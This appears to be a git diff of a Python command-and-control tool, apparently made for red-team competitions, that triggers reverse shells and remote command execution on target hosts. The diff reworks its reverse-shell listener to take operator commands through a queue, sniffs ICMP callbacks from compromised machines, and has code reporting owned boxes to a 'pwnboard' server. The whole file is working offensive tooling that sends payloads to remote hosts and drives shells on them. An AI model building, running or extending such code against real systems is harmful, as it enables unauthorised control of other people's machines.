@@ -8,6 +8,7 @@ import confuse
 import socket, sys, time
 import requests
 import multiprocessing
+from queue import Queue
 
 pwnboard = "http://lumbercamp.pwnboard.win/pwn/boxaccess"
 
@@ -55,8 +56,7 @@ def updatePwnboard(ip):
     except Exception as E:
         print(E)
 
-def listen():
-    TIME_WAIT = 0.25
+def listen(queue):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((shellparams['LHOST'], shellparams['LPORT']))
@@ -64,6 +64,7 @@ def listen():
     conn, addr = s.accept()
     print(colored(f"[+] Shell received from: {addr}\n\n","green"))
     first = True
+    TIME_WAIT = 0.50
     while True:
         ans = conn.recv(1024 * 128).decode()
         sys.stdout.write(ans)
@@ -71,13 +72,13 @@ def listen():
             command = "\r"
             first = False
         else:
-            command = input()
+            command = queue.get()
 
         if command == "!increase":
             TIME_WAIT += 0.25
+            command = "\r"
         elif command == "!decrease":
             TIME_WAIT -= 0.25
-        else:
             command = "\r"
 
         command += "\n"
@@ -87,13 +88,13 @@ def listen():
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
         if command == "exit\n":
             break
-
+    
     s.close()
 
 
 def pingListen():
-    print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
-    pkts = scapy.sniff(filter="icmp", timeout=15) # listen for 15 seconds for callbacks
+    print(colored(f"[*] Waiting 10 seconds for callbacks.\n", "cyan"))
+    pkts = scapy.sniff(iface="bridge101", filter="icmp", timeout=10) # listen for 10 seconds for callbacks
     tCallbacks = []
 
     for packet in pkts:
@@ -101,14 +102,9 @@ def pingListen():
             tCallbacks.append(packet[scapy.IP].src)
 
     fCallbacks = list(dict.fromkeys(tCallbacks))
-    # print(fCallbacks)
     for ip in fCallbacks:
         print(colored(f"[+] Ping received from: {ip}\n","green"))
-        updatePwnboard(ip)
-        try:
-            req = requests.post(host, json=data, timeout=3)
-        except Exception as E:
-            print(E)
+        # updatePwnboard(ip)
 
 def initPing(params):
     if baseparams["PROXY"] != "":
@@ -324,16 +320,20 @@ def ready(params):
                     execute(plaintext, cmdparams)
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["LHOST"]) 
-                    t = multiprocessing.Process(target=listen, args=())
+                    queue = multiprocessing.Queue()
+                    t = multiprocessing.Process(target=listen, args=(queue,))
                     t.start()
                     execute(plaintext, shellparams)
+                    command = "\r"
                     try:
+                        while command != "exit":
+                            command = input()
+                            queue.put(command)
                         t.join()
                     except KeyboardInterrupt:
                         t.terminate()
                         print(colored(f"[-] No shell received.","red")) 
                         continue
-
                     print(colored("\n[*] Shell closed.\n", "cyan"))
                 elif baseparams["MODE"] == "GROUP" and verify(groupparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
@@ -349,10 +349,10 @@ def ready(params):
                     continue
             elif user_cmd == "PING":
                 if baseparams["MODE"] == "CMD" and verify(cmdparams):
-                    print('running ping command')
                     plaintext = initPing(cmdparams)
                     t = multiprocessing.Process(target=pingListen, args=())
                     t.start()
+                    time.sleep(5)
                     execute(plaintext, cmdparams)
                     t.join()
                 elif baseparams["MODE"] == "GROUP" and verify(groupparams):
@@ -362,6 +362,7 @@ def ready(params):
                     plaintext = initPing(groupparams)
                     t = multiprocessing.Process(target=pingListen, args=())
                     t.start()
+                    time.sleep(5)
                     for iplist in groupList:
                         for ip in iplist:
                             groupparams["RHOST"] = ip
